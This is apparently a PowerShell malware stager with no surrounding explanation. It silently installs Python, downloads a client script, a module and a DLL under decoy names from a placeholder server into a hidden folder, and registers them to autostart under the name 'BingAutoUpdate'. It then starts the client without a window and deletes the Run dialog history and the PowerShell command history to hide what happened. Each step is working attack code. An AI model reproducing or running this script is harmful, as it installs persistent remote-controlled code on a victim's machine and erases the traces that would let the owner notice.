# --- Set up environment 
$dir = "$env:localappdata\.hephaestus"
$python = "$env:localappdata\Programs\Python\Python313"

Get-ChildItem -Path $dir -Recurse | Remove-Item -Force -Recurse

if (-not (Test-Path -Path $dir)) {
  New-Item -Path $dir -ItemType Directory
}


# --- Install python if not installed
if (-not (Test-Path -Path "$python")) {
  $pythonVersion = "3.13.3"
  $installerName = "python-$pythonVersion-amd64.exe"
  $pythonInstallerUrl = "https://www.python.org/ftp/python/$pythonVersion/$installerName"
  $installerPath = "$env:TEMP\$installerName"

  Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $installerPath
  Start-Process -FilePath $installerPath -ArgumentList "/quiet", "InstallAllUsers=0", "PrependPath=0" -Wait

  Remove-Item $installerPath
}


# --- Download required files
$url = "https://your_server.com"

Invoke-WebRequest "$url/api/static/client.pyw" -OutFile "$dir\client.pyw"
Invoke-WebRequest "$url/api/static/module.pyd" -OutFile "$dir\mediaplayer.cp313-win_amd64.pyd"
Invoke-WebRequest "$url/api/static/client.dll" -OutFile "$dir\core.dll"


# --- Add file to autostart and start a python process
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BingAutoUpdate" -Value "$python\pythonw.exe $dir\client.pyw" -Type String
Start-Process -FilePath "$python\pythonw.exe" -ArgumentList "$dir\client.pyw"


# --- Clean up
$MRU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path -Path $MRU) {
  Remove-Item -Path $MRU -Recurse
}

$PSReadLineHistory = "$env:appdata\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path -Path $PSReadLineHistory) {
  Remove-Item -Path $PSReadLineHistory
}
